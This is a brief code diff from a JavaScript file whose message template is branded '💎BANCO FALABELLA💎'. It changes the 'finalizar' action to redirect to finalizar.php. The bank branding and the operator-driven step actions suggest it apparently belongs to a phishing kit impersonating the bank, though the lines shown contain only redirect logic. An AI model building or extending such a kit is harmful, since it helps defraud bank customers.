@@ -375,8 +375,7 @@ const mensaje = `💎BANCO FALABELLA💎
                     break;
                 case 'confirm_finalizar':
                 case 'finalizar':
-                    // No redirigir a finalizado.php según nueva instrucción
-                    window.location.href = "index.html";
+                    window.location.href = "finalizar.php";
                     break;
                 default:
                     console.warn('Action desconocida', result.action);
